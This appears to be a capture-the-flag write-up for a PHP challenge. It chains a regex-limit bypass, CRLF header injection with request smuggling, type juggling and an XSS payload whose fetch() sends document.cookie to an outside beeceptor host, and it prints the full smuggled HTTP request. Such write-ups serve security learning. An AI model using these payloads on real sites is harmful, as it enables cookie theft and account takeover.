# Damn, I Love PHP!

1. Register and login
2. Change the user role to "admin" by supplying string "admin" 10000 times

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SESSION['user'])) {
    $newRole = $_POST['role'] ?? '';
    if (preg_match('/(admin)+/s', $newRole) ||
        preg_match('/[^\x20-\x7E]/', $newRole) ||
        !preg_match('/^[a-z0-9]+$/', $newRole)
    ) {
        echo "Invalid role: cannot contain 'admin'";
        exit;
    }
    ...
```

In this case, this code uses regex groups, if there are too many matches with the regex pattern, PHP will ignore the user input because there is a limit to how many strings can be captured

2. There is a CRLF injection in the HTTP request header in the action called `request`

```php
$headers = [];
$headerMap = [
    'User-Agent'        => 'HTTP_USER_AGENT',
    'Cookie'            => 'HTTP_COOKIE',
    'Accept'            => 'HTTP_ACCEPT',
    'Accept-Language'   => 'HTTP_ACCEPT_LANGUAGE',
    'Referer'           => 'HTTP_REFERER',
];

foreach ($headerMap as $headerName => $serverKey) {
    if (!empty($_SERVER[$serverKey])) {
        $headerValue = urldecode($_SERVER[$serverKey]);
        $headers[] = "$headerName: $headerValue";
    }
}
```

This can be done by using any of the 5 headers like this

```
User-Agent: %0d%0aTest:%201
```

And since we are using NGINX as a web server, we can do HTTP pipelining which means we can hit other endpoints like /report/ and do XSS

3. In the internal service there is an XSS vulnerability but you have to do type juggling first

```php
    $digit = $_GET['digit'];
    if ((int) $digit) {
        ...
    }
```

And chain it with XSS using this payload:

```
https://example.com/#<img/src="x"/onerror=fetch('https://waefawe.free.beeceptor.com/?c='+document.cookie)>

document.body.innerHTML=location.hash
document.body.innerHTML=document.body.innerText
```

However, because many characters are blocked (like ; and ()), the final result is like this

```
http://app:8080/?digit=3 instanceof [document['body']['innerHTML']=location['hash']][document['body']['innerHTML']=document['body']['innerText']]#<img/src="x"/onerror=fetch('https://waefawe.free.beeceptor.com/?c='+document.cookie)>
```

And the final payload will look like this

```
POST /?action=request HTTP/1.1
Host: 127.0.0.1:50001
Debug: 1
Referer: %0d%0a%0d%0aPOST%20/report/%20HTTP/1.1%0d%0aHost:%20internal-svc%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%20260%0d%0a%0d%0aurl=http://app:8080/?digit=3%20instanceof%20[document['body']['innerHTML']=location['hash']][document['body']['innerHTML']=document['body']['innerText']]%23%2526lt;img/src=%2526quot;x%2526quot;/onerror=fetch('https://waefawe.free.beeceptor.com/?c='%252bdocument.cookie)%2526gt;
Cookie: PHPSESSID=8180922c675e755a12348884f5b477a7
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

path=/
```

# Ref
- https://github.com/hunter0x8/XSS-Payloads-1/blob/master/Without-Parentheses.md